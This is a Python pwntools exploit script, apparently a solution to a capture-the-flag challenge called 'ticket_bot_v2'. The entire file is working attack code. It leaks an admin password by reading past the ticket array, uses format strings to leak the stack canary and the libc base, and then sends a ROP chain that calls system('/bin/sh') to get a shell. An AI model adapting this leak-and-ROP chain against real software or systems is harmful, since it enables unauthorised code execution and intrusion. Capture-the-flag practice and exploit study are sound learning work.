#!/usr/bin/env python3


from pwn import *




def GrabNewTicket(data):
    r.sendlineafter(b"3. Service Login\n",b"1")
    r.recvline()
    print(r.recvline())
    r.sendlineafter(b"Please tell me why your here:",data)


def ViewTicket(index):
    r.sendlineafter(b"3. Service Login\n",b"2")
    r.sendlineafter(b"please enter your ticketID\n",f"{index}")

def AdminLogin(leak):
    r.sendlineafter(b"3. Service Login\n",b"3")
    r.sendlineafter(b"Admin Password",f"{leak}")

def ChangeAdminPassword(data):
    r.sendlineafter(b"2. reset all Tickets",b"1")
    r.sendlineafter(b"Enter new Password",data)

e = ELF("./ticket_bot_v2")
r = process("./ticket_bot_v2")
#r = remote("ticket-bot-v2.challs.csc.tf",1337)
libc = ELF("./libc.so.6")
r.sendlineafter(b"Please tell me why your here:",b"Shit")
for i in range(0,5):
    GrabNewTicket(b"Yoo")
ViewTicket(5)
r.recvuntil(b"Yoo\x00")
password = u64(r.recvuntil(b"View Ticket")[0:8].decode('latin-1').ljust(8,'\x00'))
AdminLogin(password)
canary = b"%7$p"
ChangeAdminPassword(canary)
r.recvline()
r.recvline()
canary = int(r.recvline().strip(b"========================\n"),16)
log.info("The canary of the process is " + hex(canary))
AdminLogin(password)
libc_leaker = b"%p"
ChangeAdminPassword(libc_leaker)
r.recvline()
r.recvline()
libc_base = int(r.recvline().strip(b"========================\n"),16) - 0x1ed723
log.info("The libc base of the process is " + hex(libc_base))
exploit = b"A" * 8 + p64(canary) + b"A" * 8 + p64(libc_base + 0x23b6a) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + 0x23b6b) + p64(libc_base + libc.sym.system)
AdminLogin(password)
#r.sendlineafter(b"2. reset all Tickets",b"1")
#r.interactive()
#print(exploit)
#r.sendline(exploit)
ChangeAdminPassword(exploit)
r.interactive()
